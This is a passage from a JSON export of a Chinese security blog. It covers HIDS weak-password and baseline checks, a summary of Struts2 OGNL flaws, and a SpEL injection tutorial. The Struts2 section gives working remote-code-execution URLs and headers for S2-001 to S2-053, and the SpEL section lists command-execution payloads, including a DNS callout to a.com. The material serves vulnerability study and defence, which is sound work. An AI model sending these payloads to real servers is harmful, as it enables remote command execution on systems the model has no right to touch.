MD5                                                          |\n| 2a   | Blowfish (not in mainline glibc; added in some Linux distributions) |\n| 5    | SHA-256 (since glibc 2.7)                                    |\n| 6    | SHA-256 (since glibc 2.7)                                    |\n\n**检测规则：**\n\n1. 查看ID是否为6，不为6告警加密算法强度不够\n2. 定义弱口令字典，根据`编码(hash(\"passwd＋salt\"))`规则加密弱口令字典，和/etc/shadow中的encrypted比较，相等则存在弱口令，代码可参考： https://kknews.cc/code/pyolgke.html\n\n### DB弱口令空口令\n\n#### Mysql\n\nmysql弱口令探测不使用直接连接爆破，而是去爆破存储密码hash文件的user.MYD。\n\n1. 通过mysql进程pid，获取/proc/[mysql_pid]/cwd/mysql/user.MYD，`strings user.MYD`然后解析提取里面的hash值。\n2. mysql加密方式是通过两次SHA1加密`SHA1(SHA1($pass))` ，[python代码](https://blog.csdn.net/xluren/article/details/17539719)实现很简单。\n\n#### 其他DB\n\n常用\n\n```\nMysql\nMongoDB\nPostgresql\nRedis\nMemcached\n```\n\n1. 这几个是常用的数据库，检测逻辑是**主动发起一个连接**，看是否能链接成功，可以检测弱口令以及空口令的情况。\n\n2. 发起连接后，最后都要调用下close，确保连接关闭。\n\n3. Mysql检测文件的方法难检测空口令，可以用这种主动连接的方式进行检测。\n\n实现逻辑参考：https://github.com/y1ng1996/F-Scrack/blob/master/F-Scrack.py\n\n\n\n**参考：**\n\nhttps://blog.csdn.net/pyufftj/article/details/28012219\n\nhttps://zhuanlan.zhihu.com/p/37165658\n\n[https://wiki.silic.wiki/习科旧站:获取mysql中user.myd中hash技巧](https://wiki.silic.wiki/习科旧站:获取mysql中user.myd中hash技巧)\n\nhttps://xz.aliyun.com/t/6172","tags":["反入侵","基线检测","弱口令检测"],"categories":["反入侵策略"]},{"title":"反入侵策略总结-基础信息搜集","url":"/2019/04/01/反入侵策略总结-基础信息搜集/","content":"\n# 前言\n\n本系列文章将对HIDS做个简介，互联网团队自研一个HIDS系统，需要研发、策略、运营。研发和运营将不做介绍，本系列就对HIDS的核心**（安全策略）**做个简单的研究。基本上是根据自己的整理的思维导图做个梳理**（暂时只研究linux的策略）**：\n\n# 介绍\n\n主机入侵检测系统（HIDS）是基于主机的入侵检测系统，部署在需要防护的主机服务器上的代理程序，用于监控和报告系统配置和应用程序活动。一些常见的功能包括日志分析，完整性测试、策略实施和rootkit检测。自研的HIDS可以针对特定用例进行定制，使得安全研究中可以及时方便的构建自定义规则。目前开源的入侵检测系统有大名鼎鼎的ossec、国内开源的yulong以及facebook的osquery。HIDS检测的核心数据包含**命令、网络、文件**三大类型，文件产生进程、进程产生网络。HIDS的各种安全策略都是通过这3种类型进行安全分析而得出的规则。\n\n# 架构\n\n目前大部分的HIDS平台建设主要分三大部分：**终端Agent监控组件，Dashboard控制面板和与SIEM、运维数据等其他平台对接的接口集合**。\n\n**终端Agent组件：**主要作用包括监控文件变更、监控服务器状态、下发一些操作指令等。\n\n**DashBoard：**用来执行一些策略推送、资源管理方面的操作\n\n**MQ && Servers：**用来做负载均衡并吞吐数据到数据库\n\n**Database：**数据库\n\n**SIEM APIs**：用来将HIDS的数据和SIEM做整合\n\n![1](/images/a10/1.png)\n\n# 功能\n\n1. **基础信息收集：**系统版本号、系统用户、web组件、数据库、三方组件包等信息，主要用于CVE漏洞检测以及应急响应。\n2. **日志监控：**主要是登录相关的日志、bash日志以及webserver产生的日志，主用用做异常登录监控、危险命令监控以及基础DOS检测。\n3. **文件监控：**新增文件、敏感权限文件、核心文件变动监控、crontab文件监控，主要用于rookit检测、webshell监控等。\n4. **进程监控：**主要用于木马、反弹shell、rookit等检测。\n5. **流量监控：**主要用于木马，反弹shell等发生网络行为的一些异常监控。\n6. **系统命令监控：**主要用于入侵后命令执行的检测。\n\n# 信息搜集\n\n## 系统基本信息\n\n- **系统版本：**根据操作系统解析相应 `/etc/readhat-release`、`/etc/redhat-release`、`/etc/gentoo-release`文件系统版本信息搜集。\n\n- **keneral信息：**解析`/proc/cmdline`和`/proc/version`\n\n- **用户信息：**通过`/etc/passwd`文件搜集用户信息，剔除nologin的用户\n\n- **进程信息：**通过遍历/proc目录下获取所有的进程信息，取信息参考[/proc目录结构](https://common.cnblogs.com/editor/tiny_mce/plugins/preview/ http://man7.org/linux/man-pages/man5/proc.5.html )\n\n- **环境变量信息**：切换到各个用户，运行以下[命令](https://common.cnblogs.com/editor/tiny_mce/plugins/preview/ https://www.jianshu.com/p/fec33aed017b)。\n\n  - set命令显示当前shell的变量，包括当前用户的变量;\n  - env命令显示当前用户的变量;\n  - export命令显示当前导出成用户变量的shell变量。\n\n- **已登录用户信息：**已登录用户保存在`/var/run/utmp`（对应linux `who`命令），c函数`getutxent`可直接解析此文件获取信息\n\n- **历史登录用户信息：**已登录用户保存在`/var/run/utmp`/（对用linux `last`命令），c函数`getutxent`可直接解析此文件获取信息\n\n- **WEB Server进程信息：**通过监控到的所有的进程信息，筛选出命令行运行了`nginx|httpd|apache|tomcat|weblogic|jboss|jetty`等webserver的信息。通过`/proc/[pid]/cmdline`获取到服务运行的命令行，一般是用于搜集webserver的版本号以及webserver的web代码路径。不同的webserver要通过不同的方法的命令和方法获得，例如nginx可以通过找到nginx的路径运行`nginx –v`获得版本信息，通过读取`/proc/[pid]/cmdline`命令行信息匹配-c的内容或者`/proc/[pid]/cwd`运行目录获取到web文件的路径。\n\n- **数据库信息进程信息：**数据库配置路径和版本的获取方法和web路径获取方法类似。\n\n- **三方组件信息：**三方组件包最常见的就是java的三方组件，获取方法是遍历webservers三方路径下的jar文件。如果是war文件部署，还需要把war包解压，然后再重复上述步骤遍历.jar**文件获取到三方组件的名字和版本号**。另一种更优雅获取组件的方式可能是解析web应用的[pom.xml](https://www.javatpoint.com/maven-pom-xml)文件（并非所有java web应用程序都有），文件里的标签 ``管理着三方组件的信息。\n\n  其他组件的搜集（例如ThinkPHP等框架），主要也就是匹配框架指纹（[可能根据robots.txt文件，可能根据一个文件里的特定内容等）](https://blog.51cto.com/simeon/2115190)这个就需要大家去网上或者自己搭建搜集指纹，可以优先常用cms的识别方法，后期可慢慢优化添加其他框架。\n\n- **crontab信息：**`/etc/crontab`文件保存系统计划任务，`/var/spool/cron/`文件夹保存用户计划任务\n\n  ```c++\n  \"/etc/cron.d/\", // system all\n  \"/var/at/tabs/\", // user mac:lion\n  \"/var/spool/cron/\", // user linux:centos\n  \"/var/spool/cron/crontabs/\", // user linux:debian\n  ```\n\n  上面的路径是[开源HIDS](https://github.com/osquery/osquery)里定义的\n\n- **authorized信息**：遍历所有加目录下的`\".ssh/authorized_keys\",\".ssh/authorized_keys2\"`文件\n\n- **konw_host文件：**遍历所有用户家目录下的`.ssh/known_hosts`文件\n\n- **sudoers信息：**解析`/etc/sudoers`和`/etc/sudoers.d/`目录下的文件\n\n- **iptables信息：**解析`/proc/net/ip_tables_names`文件\n\n- **系统控制文件：**解析系统控制配置文件\n\n  - 系统文件路径：`/etc/sysct.conf`\n\n  - 系统控制文件可能存在路径\n\n    ```c++\n    \"/run/sysctl.d/%.conf\",           \n    \"/etc/sysctl.d/%.conf\",\n    \"/usr/local/lib/sysctl.d/%.conf\", \n    \"/usr/lib/sysctl.d/%.conf\",\n    \"/lib/sysctl.d/%.conf\",\n    ```\n\n- **其他信息（非完整）：**\n\n  - **memory_map：**解析`/proc/iomem`\n  - **mounts：**解析`/proc/mounts`\n  - **modules：**解析`/proc/modules`\n  - **memory_info：**解析`/proc/meminfo`\n  - **shared_memory：**通过`shmctl`函数遍历merory id从1遍历到最大\n  - **uptime：**通过`sysctl`函数获取boottime\n\n## 重要文件监控\n\n这项功能实现很简单，就是定时计算整个目录下文件或者单个的Hash值并存储起来。但是哪些文件属于重要文件就需要安全人员去研究定义，这个过程可能不是一蹴而就，一方面可能新的漏洞层出不穷，一方面是受限于个人的知识点有限，无法梳理出所有通用的漏洞策略。以下是一些我的不完全整理：\n\n- **`/bin/ps`、`/bin/netstat`、`/usr/sbin/lsof`、`/usr/bin/top`等命令：**rookit时候hacker可能会替换这些系统命令\n\n- **libc.so文件：**ubuntu平台`/usr/lib/x86_64-linux-gnu/libc.so`，centos平台`/lib64/libc.so.6`。查看某个平台具体的libc.so文件路径，可以运行`ldd ls | grep libc.so`。\n\n- **开机启动文件：**\n\n  - /etc/init.d是 /etc/rc.d/init.d 的软链接，测试新装的linux系统必须开启的服务\n\n    `ssd、rsyslog、network、crond`\n\n  - [/etc/rc.local](https://common.cnblogs.com/editor/tiny_mce/plugins/preview/  https://www.landui.com/help/nshow-8196.html  )\n\n    - 基于白名单过滤，查找异常的执行命令\n\n    - 基于已知的特征做数量统计或异常行为分析。\n\n- **/etc/profile文件：**本文件可设置全局的系统变量。\n\n- **内核模块：** `ls -alt /sys/module`\n\n- **预加载文件：**`/etc/ld.so.preload`\n\n- **suid文件监控：**全局搜索是不太现实，一般服务器负载都比较高，全局搜索耗时和对系统负担大。\n\n  ```c++\n  \"/bin\",           \n  \"/sbin\",           \n  \"/usr/bin\", \n  \"/usr/sbin\",\n  \"/usr/local/bin\", \n  \"/usr/local/sbin\", \n  \"/tmp\",\n  ```\n\n  搜索上述几个路径的文件，判断权限是[suid和guid](https://www.cnblogs.com/sparkdev/p/9651622.html)\n\n## 日志搜集\n\n- **/var/log/secure：**Linux系统的安全日志，记录用户和工作组变化情况、用户登陆认证情况。一般入侵告警ssh被尝试爆破就是通过这个文件来进行规则制定的。\n- **/var/log/wtmp：**该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件，这个文件是二进制文件，cat查看不了，可以使用last命令查看。此文件可用于异常用户登录检测，通过检测异常的IP和登录地进行告警。\n- **history日志：**监控用户输入的历史命令，后续会讲到具体做法。\n- **webserver日志：**主要用于应急响应或者做些cc攻击的防御，是否集成到HIDS里有待商榷。定位到日志的具体路径是难点，做简单的cc攻击防御的话，最简单可以通过ip时间段内访问频率来设置防御策略。\n\n \n\n**参考：**\n\nhttps://www.freebuf.com/articles/es/197337.html\n\nhttps://www.freebuf.com/articles/es/194510.html\n\n![img](https://common.cnblogs.com/editor/tiny_mce/themes/advanced/img/trans.gif)","tags":["反入侵","基础信息搜集"],"categories":["反入侵策略"]},{"title":"Struts2历史漏洞总结","url":"/2019/03/23/Struts2历史漏洞总结/","content":"# 前言\n\n本文章不分析各个漏洞的具体原理了，这篇文章https://www.freebuf.com/vuls/217482.html已经归纳了struts2历史漏洞的分析。大部分漏洞都是因为执行了ongl表达式造成的，关于ognl前一篇文章也做了详细的介绍。我就做简单的归纳，以及选代表漏洞做具体的调试过程。\n\n# strust2漏洞简要分析\n\n## S2-001\n\n**适用版本：**2.0.0 – 2.0.8\n\n**POC:**\n\n```java\n%{@java.lang.Runtime@getRuntime().exec(\"open /Applications/Calculator.app/\")}\n```\n\n**简单原理：**\n\n没有任何过滤。struts2用来处理传入参数以及request中各项参数的值栈OgnlValueStack在进行取值的时候，就会去调用ognl的getValue参数，从而造成命令执行。\n\n## S2-003\n\n**适用版本：**2.0.0 – 2.1.8.1\n\n**POC：**\n\n```java\nhttp://www.glassy.com/test.action?('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(a)(b)&('\\u0040java.lang.Runtime@getRuntime().exec(\\'open\\u0020/Applications/Notes.app/\\')')(a)(b)\n```\n\n**简单原理**：\n\nOgnl.setValue同意具有执行java代码的能力，S2-003就是利用了**Ognl.setValue**的执行java代码的能力造成的RCE。需要构造ASTEval语法树：\n\n```java\nOgnlContext context = new OgnlContext();\nOgnl.setValue(\"(\\\"@java.lang.Runtime@getRuntime().exec(\\'open /Applications/Calculator.app/\\')\\\")(glassy)(amadeus)\",context,\"\");\n```\n\n## S2-005\n\n**适用版本：**2.0.0 – 2.1.8.1\n\n**POC:**\n\n```java\nhttp://www.glassy.com/test.action?('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(a)(b)&('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(a)(b)&('\\u0023_memberAccess.allowStaticMethodAccess\\u003dfalse')(a)(b)&('\\u0040java.lang.Runtime@getRuntime().exec(\\'open\\u0020/Applications/Notes.app/\\')')(a)(b)\n```\n\n**简单原理：**\n\nS2-005就是对于S2-003的绕过，从上面的修复可以看到，补丁的关键部分在于通过对**securityMemberAccess的两个成员变量allowStaticMethodAccess和excludeProperties对OGNL表达式能否加载函数**，然而通过OGNL表达式，我们可以改写这两个变量的值（和denyMethodExecution是一个套路），来实现补丁的绕过。\n\n## S2-007\n\n**适用版本：**2.0.0 – 2.2.3\n\n提交的参数配置了验证规则并对提交的参数进行类型转换的时候会造成OGNL表达式的执行，具体是由ConversionErrorInterceptor拦截器触发的。\n\n## S2-009\n\n**适用版本：**2.0.0 – 2.3.1.1\n\nS2-009其实就是对003和005的绕过。\n\n**简单原理：**\n\n```java\nOgnlContext context = new OgnlContext();\nOgnl.setValue(\"password\",context,\"@java.lang.Runtime@getRuntime().exec('open /Applications/Notes.app/')(glassy)\");\nOgnl.setValue(\"a[(password)(glassy)]\",context,\"true\");\n```\n\n第一行代码用于将password-payload的map写入ognl的root中去，第二行代码中的a[(password)(glassy)]在AST树中进行解析的时候按照从右到左，从里到外的顺序进行解析，因此优先解析(password)(glassy),password的值在root中有（password-payload），于是解析成了payload(glassy)的形式，然后就是和ST2-003一样的原理造成了RCE了。\n\n## S2-012\n\n**适用版本：**Struts Showcase 2.0.0 – Struts Showcase 2.3.14.2\n\n**POC:**\n\n```java\n%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"/bin/bash\", \"-c\", \"open /Applications/Notes.app/\"})).start()}\n```\n\n**简单原理：**\n\n造成这个RCE的问题出在了重定向上，当需要从ST2的值栈中读取数据作为重定向的参数，而这个值又是前端可控的情况下可以造成RCE。注意：\n\n这次的poc没有使用Runtime类而改用了ProcessBuilder类，这个类有一个优势，**它不是静态类，命令执行的时候调用的start方法也不是静态方法，不受OgnlValueStack类的allowStaticMethodAccess值的限制。**\n\n## S2-013\n\n**适用版本：**2.0.0 – 2.3.14.1\n\n**简单原理：**\n\njsp通过s:url或s:a标签来动态生成跳转的action的时候，如果想把jsp里面的参数带到action的后面，就需要配置includeParams，这样的话服务端就会先去拿到jsp的参数，并带到ST2的ognl里面计算一下这个参数再去拼接到action后面，从而造成了rce。\n\n## S2-015\n\n**适用版本：**2.0.0 – 2.3.14.2\n\n使用通配符*来做action映射的时候会导致问题。\n\n```xml\n<action name=\"*\" class=\"example.ExampleSupport\">\n    <result>/example/{1}.jsp</result>\n</action>\n```\n\nST2处理通配符配置的action映射的时候流程是这样的：如果一个请求的action在映射中不存在，那么就会去匹配通配符，ST2会根据请求的action名来加载对应的jsp文件。以上面的配置为例子，当请求一个struts.xml中不存在的test.action的时候，ST2就会去吧/example/test.jsp的内容返回给前端。\n\n## S2-016\n\n**适用版本：**2.0.0 – 2.3.15\n\n**POC:**\n\n```java\nhttp://www.glassy.com/Struts2Demo_war_exploded/hello.action?redirect:%24%7b%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5b%5d%7b%27%2fbin%2fbash%27%2c+%27-c%27%2c%27open+%2fApplications%2fNotes.app%2f%27%7d)).start()%7d\n```\n\n**简单原理：**\n\nST2使用action:或redirect:\\redirectAction:作为前缀参数来进行短路导航状态变化，后面的语句会直接进行ognl表达式计算。\n\n##S2-019\n\n**适用版本：**2.0.0 – 2.3.15.1\n\n**POC:**\n\n```java\nhttp://www.glassy.com/Struts2Demo_war_exploded/hello.action?debug=command&expression=%23a%3d(new+java.lang.ProcessBuilder(%27open+%2fApplications%2fNotes.app%2f%27)).start()\n```\n\n**简单原理：**\n\n当struts2开启求开发者模式时候，可以直接远程通过debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中。\n\n## S2-029\n\n**适用版本：**2.0.0 – 2.3.24.1 (不包括2.3.20.3)\n\n## S2-032\n\n**适用版本：2.3.20 – 2.3.28**（2.3.20.3和2.3.24.3除外）\n\n## S2-032\n\n**适用版本：2.3.20 – 2.3.28（2.3.20.3和2.3.24.3除外）**\n\n**POC**\n\n```java\nhttp://www.glassy.com/struts2-showcase/home11.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D),d&cmd=/Applications/Notes.app/Contents/MacOS/Notes\n```\n\n**简单原理：**\n\n这个版本漏洞要求在struts.xml中将DynamicMethodInvocation设置为true才能利用成功。（低版本ST2的DynamicMethodInvocation默认为true，高版本默认为false）\n\n```\n<constant name=\"struts.enable.DynamicMethodInvocation\" value=\"true\" />\n```\n\n当所有的interceptors调用完成后，计算返回码的时候，ST2就开始去计算我们最初传过来的method：后面的值，从而把内容放进了ognl.getValue，造成了RCE。\n\n## S2-045\n\n**适用版本：**2.3.5 – 2.3.31, 2.5 – 2.5.10\n\n**POC:**\n\n```java\nContent-Type:%{(#glassy='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#a=(new java.lang.ProcessBuilder('/Applications/Notes.app/Contents/MacOS/Notes')).start())}\n```\n\n**简单原理：**\n\nST2收到的request包包含Content-Type，并且Content-Type中包含“multipart/form-data”的时候会把请求交给MultiPartRequestWrapper处理，经过几个函数后，报错的信息被传入了TextParseUtil.translateVariables，translateVariables会在后续的调用中将报错信息中用%{}包裹的内容带入ognl.getValue。\n\n## S2-046\n\n同s2-045\n\n## S2-048\n\n**适用版本：**使用了Struts 1 plugin 和Struts 1 action 的2.3.x 版本\n\n得使用到struts1，条件苛刻，不具体分析，有兴趣看freebuf的详细分析\n\n## S2-053\n\n**适用版本：**2.0.0 – 2.3.33 , 2.5 – 2.5.10.1\n\n**POC：**\n\n```java\nhttp://www.glassy.com/Struts2Demo_war_exploded/s2053.action?name=%25%7b(%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23a%3d(new+java.lang.ProcessBuilder(%27%2fApplications%2fNotes.app%2fContents%2fMacOS%2fNotes%27)).start())%7d\n```\n\n**简单原理：**\n\n053版本的利用条件也比较苛刻，只有服务端将用户可控的参数放到了Freemarker的标签属性中的时候，才会造成RCE，实例写法如下，\n\n```java\n<@s.url value=\"${name}\"/>\n```\n\n当name参数是客户端传过来的时候，就会在ST2服务器上造成RCE。st2看到返回的页面是Freemarker模板的，所以交给FreemarkerResult类处理，Freemarker在处理的时候需要去找name的值以便生成完整的标签，于是通过ST2去findString，发现name参数是ognl表达式，于是交给了ognl.getValue，造成了rce。\n\n## 漏洞总结\n\n| 漏洞名称 | 命令注入位置                               | OGNL执行函数  | 漏洞成因                                                     |\n| :------- | :----------------------------------------- | :------------ | :----------------------------------------------------------- |\n| S2-001   | 参数值                                     | Ognl.getValue | 当参数值是形如%{*}的形式的时候，ST2会把这个值当做OGNL表达式去执行。 |\n| S2-003   | 参数名                                     | Ognl.setValue | 通过构造形如(exp)(a)(b)的形式的表达式，放入ognl.setvalue，最终会将exp带入ognl.getvalue |\n| S2-005   | 参数名                                     | Ognl.setValue | S2-003的绕过，通过ognl表达式，可以对ognl的root、context中的值做任意修改，从而绕过基于定义变量值的补丁 |\n| S2-007   | 参数值                                     | Ognl.getValue | 当对参数做了类型限制，而类型转换出错的时候，ST2会把出错的参数值带入Ognl.getValue |\n| S2-009   | 参数值和参数名的配合                       | Ognl.setValue | 003和005的绕过通过构造一个带有payload的值a传给ognl，再通过把(b)(a)带如ognl.setvalue从而造成和005一样的rce |\n| S2-012   | 重定向参数                                 | Ognl.getValue | 计算重定向url的时候会把重定向参数的值放入ognl.getvalue中     |\n| S2-013   | 使用特殊s:url或者s:a标签的action的参数值   | Ognl.getValue | 计算标签中action路径的时候，会把参数值带入ognl.getvalue      |\n| S2-015   | action值                                   | Ognl.getValue | 计算重定向url的时候会把action的值放入ognl.getvalue中         |\n| S2-016   | action:或redirect:\\redirectAction:后面的值 | Ognl.getValue | 同012                                                        |\n| S2-019   | debug和expression的参数值                  | Ognl.getValue | ST2开启调试模式的时候，自带的可以执行ognl表达式的功能        |\n| S2-029   | 写入jsp中st2标签特殊属性值中的参数值       | Ognl.getValue | 返回给前端的jsp中的st2标签的属性值是形如%{exp}的形式的时候，会把exp放入ognl.getvalue |\n| S2-032   | method:后的参数值                          | Ognl.getValue | 计算返回结果的时候，ST2就开始去计传过来的method：后面的值，从而把内容放进了ognl.getValue |\n| S2-045   | Content-Type的值                           | Ognl.getValue | ST2在处理上传文件出错的时候且错误信息中带%{exp}的时候，会把exp带入ognl.getValue |\n| S2-048   | 传入ActionMessage的key中的参数值           | Ognl.getValue | ST2处理ST1的action的时候会把ActionMessage的key传给ognl.getValue |\n| S2-053   | Freemarker的标签属性中的参数值             | Ognl.getValue | 计算Freemarker的标签属性值的时候会参数的值放入ognl.getvalue中 |\n\n# strust2漏洞调试\n\nhttps://github.com/proudwind/struts2_vulns这个地址是struts2漏洞调试环境。\n\n需要注意都是部署环境的时候，你要测试哪个漏洞就要修改pom.xml的struts2-core版本为相应漏洞的版本，另外struts2的filter-class也需要做相应的修改。\n\n## Struts2 001漏洞调试\n\n先放着，后面补\n\n## Strust2 003漏洞调试\n\n先放着，后面补\n\n\n\n**参考：**\n\nhttps://seaii-blog.com/index.php/2019/12/29/90.html\n\nhttps://www.freebuf.com/vuls/217482.html","tags":["Strusts2","Ongl"],"categories":["JAVA安全教程"]},{"title":"SPEL漏洞解析","url":"/2019/03/20/SPEL漏洞解析/","content":"\n# 什么是SPEL\n\nSpring表达式语言全称为“Spring Expression Language”，缩写为“SpEL”，他能在运行时构建复杂表达式、存取对象属性、对象方法调用等等，并且能与 Spring 功能完美整合。表达式语言给静态 Java 语言增加了动态的功能，表达式语言是单独的模块，他只依赖与核心的模块，不依赖与其他模块，能够单独的使用。\n\n因为 Spring 框架的广泛使用，Spel 表达式的应用也十分的广泛。\n\n就安全领域而言，我们只要使用的是 #this 变量、[] 获取属性和 T 运算符，#this 变量用于引用当前评估对象，T 运算符可以用于指定 java.lang.Class 的实例，对 java.lang 中的对象的 T 引用不需要完整的包名，但引用所有其他对象时是需要的。 \n\n## **SpEL 表达式**\n\n### 基本表达式\n\n字面量表达式、关系，逻辑与算数运算表达式、字符串链接及截取表达式、三目运算、正则表达式以及括号优先级表达式；\n\n### 类相关表达式\n\n类类型表达式、类实例化、instanceof 表达式、变量定义及引用、赋值表达式、自定义函数、对象属性存取及安全导航表达式、对象方法调用、Bean 引用；\n\n### 集合相关表达式\n\n内联 List、内联数组、集合、字典访问、列表、字典；\n\n### 其他表达式\n\n模版表达式\n\n# SpEL 基础\n\n在 pom.xml 导入 maven 或是把”org.springframework.expression-3.0.5.RELEASE.jar”添加到类路径中\n\n```xml\n<properties>\n    <org.springframework.version>5.0.8.RELEASE</org.springframework.version>\n</properties>\n<dependency>\n      <groupId>org.springframework</groupId>\n      <artifactId>spring-expression</artifactId>\n      <version>${org.springframework.version}</version>\n</dependency>\n```\n\n## SpEL 使用方式\n\n1. XML配置\n\n   ```xml\n   <bean id=\"numberGuess\" class=\"org.spring.samples.NumberGuess\">\n       <property name=\"randomNumber\" value=\"#{ T(java.lang.Math).random() * 100.0 }\"/>\n       <!-- other properties -->\n   </bean>\n   ```\n\n2. 基于注解的使用\n\n   ```java\n   public class EmailSender {\n       @Value(\"${spring.mail.username}\")\n       private String mailUsername;\n       @Value(\"#{ systemProperties['user.region'] }\")    \n       private String defaultLocale;\n       //...\n   }\n   ```\n\n3. 代码里直接使用\n\n   SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。\n\n   ```java\n   ExpressionParser parser = new SpelExpressionParser();\n   Expression expression = parser.parseExpression(\"('Hello' + 'world').concat(#end)\");\n   EvaluationContext context = new StandardEvaluationContext();\n   context.setVariable(\"end\", \"!\");\n   System.out.println(expression.getValue(context));\n   ```\n\n   最后是**expression.getValue()**执行表达式\n\n   1.  **创建解析器：**SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现；\n   2. **解析表达式：**使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象。\n   3. **构造上下文：**准备比如变量定义等等表达式需要的上下文数据。\n   4. **求值：**通过 Expression 接口的 getValue 方法根据上下文获得表达式值。\n\n## SpEL 主要接口\n\n1.**ExpressionParser 接口**：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符；\n\n```java\npublic interface ExpressionParser {  \n    Expression parseExpression(String expressionString);  \n    Expression parseExpression(String expressionString, ParserContext context);  \n}\n```\n\n实例：\n\n```java\nExpressionParser parser = new SpelExpressionParser();\nParserContext parserContext = new ParserContext() {\n    @Override\n    public boolean isTemplate() {\n    return true;\n    }\n    @Override\n    public String getExpressionPrefix() {\n    return \"#{\";\n    }\n    @Override\n    public String getExpressionSuffix() {\n    return \"}\";\n    }\n};\nString template = \"#{'hello '}#{'world!'}\";\nExpression expression = parser.parseExpression(template, parserContext);\nSystem.out.println(expression.getValue());\n```\n\n**EvaluationContext 接口**：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。\n\n**Expression 接口**：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。\n\n## SpEL 类相关表达式\n\n**其中表达式支持非常多的语法，能够造成代码执行的有以下2种：**\n\n1. **类类型表达式**\n   类类型表达式：使用“T(Type)”来表示java.lang.Class实例，“Type”必须是类全限定名，“java.lang”包除外，即该包下的类可以不指定包名；使用类类型表达式还可以进行访问类静态方法及类静态字段。\n\n   ```java\n   ExpressionParser parser = new SpelExpressionParser();\n           \n   // java.lang 包类访问\n   Class<String> result1 = parser.parseExpression(\"T(String)\").getValue(Class.class);\n   System.out.println(result1);\n   \n   //其他包类访问\n   String expression2 = \"T(java.lang.Runtime).getRuntime().exec('open /Applications/Calculator.app')\";\n   Class<Object> result2 = parser.parseExpression(expression2).getValue(Class.class);\n   System.out.println(result2);\n           \n   //类静态字段访问\n   int result3 = parser.parseExpression(\"T(Integer).MAX_VALUE\").getValue(int.class);\n   System.out.println(result3);\n           \n   //类静态方法调用\n   int result4 = parser.parseExpression(\"T(Integer).parseInt('1')\").getValue(int.class);\n   System.out.println(result4);\n   ```\n\n2. **类实例化表达式**\n   类实例化同样使用java关键字“new”，类名必须是全限定名，但java.lang包内的类型除外，如String、Integer。 \n\n   ```java\n   ExpressionParser parser = new SpelExpressionParser();\n   Expression exp = parser.parseExpression(\"new java.util.Date()\");\n   Date value = (Date) exp.getValue();\n   System.out.println(value);\n   ```\n\n# 审计关键点\n\n- org.springframework.expression.spel.standard\n\n- SpelExpressionParser\n- expression.getValue\n- expression.setValue\n\n# 常用payload\n\n```java\n${12*12}\nT(java.lang.Runtime).getRuntime().exec(\"nslookup a.com\")\nT(Thread).sleep(10000)\n#this.getClass().forName('java.lang.Runtime').getRuntime().exec('nslookup a.com')\nnew java.lang.ProcessBuilder({'nslookup a.com'}).start()\n```\n\n# CVE漏洞简析\n\n## SpringBoot SpEL表达式注入漏洞\n\n**影响版本：**1.1.0-1.1.12、1.2.0-1.2.7、1.3.0\n\n其造成的原因主要是在 `ErrorMvcAutoConfiguration.java` 中的 `SpelView` 类:\n\n```java\nprivate static class SpelView implements View {\n        private final String template;\n        private final StandardEvaluationContext context = new StandardEvaluationContext();\n        private PropertyPlaceholderHelper helper;\n        private PlaceholderResolver resolver;\n \n        public SpelView(String template) {\n            this.template = template;\n            this.context.addPropertyAccessor(new MapAccessor());\n            this.helper = new PropertyPlaceholderHelper(\"${\", \"}\");\n            this.resolver = new ErrorMvcAutoConfiguration.SpelPlaceholderResolver(this.context);\n        }\n \n        public String getContentType() {\n            return \"text/html\";\n        }\n \n        public void render(Map<String, ?> model, HttpServletRequest request, HttpServletResponse response) throws Exception {\n            if(response.getContentType() == null) {\n                response.setContentType(this.getContentType());\n            }\n \n            Map<String, Object> map = new HashMap(model);\n            map.put(\"path\", request.getContextPath());\n            this.context.setRootObject(map);\n            String result = this.helper.replacePlaceholders(this.template, this.resolver);\n            response.getWriter().append(result);\n        }\n    }\n```\n\n大致流程为 `PropertyPlaceholderHelper` 类中通过 `parseStringValue` 方法递归字符串找到目标去掉 `$()` ，这个方法中调用 `resolvePlaceholder` 方法来在 `context` 中找到对应的 `name` ，并在这里执行了 `getValue` 操作。由此造成命令执行。代码如下：\n\n```java\npublic String resolvePlaceholder(String name) {\n        Expression expression = this.parser.parseExpression(name);\n \n        try {\n            Object value = expression.getValue(this.context);\n            return HtmlUtils.htmlEscape(value == null?null:value.toString());\n        } catch (Exception var4) {\n            return null;\n        }\n    }\n```\n\n其核心思想就是在递归中从 `context` 下的 `message` 中取出需要再次递归解析的 `$(payload)` ，由此来在下一次的解析后去掉 `$()` 并把其中 `payload` 当作传入的 `name` 参数来执行 `getValue` 操作。\n\n## Spring Data Commons远程代码执行漏洞（CVE-2018-1273）\n\n**影响版本：**1.13-1.13.10、2.0-2.0.5\n\n漏洞形成的原因就是当用户在开发中利用了Spring-data-commons中的特性对用户的输入参数进行自动匹配时候，会将用户提交的form表单中的参数名作为SpEL执行。\n\n**漏洞代码：**\n\n```java\nprivate static class MapPropertyAccessor extends AbstractPropertyAccessor {\n       public void setPropertyValue(String propertyName, @Nullable Object value) throws BeansException {\n           if 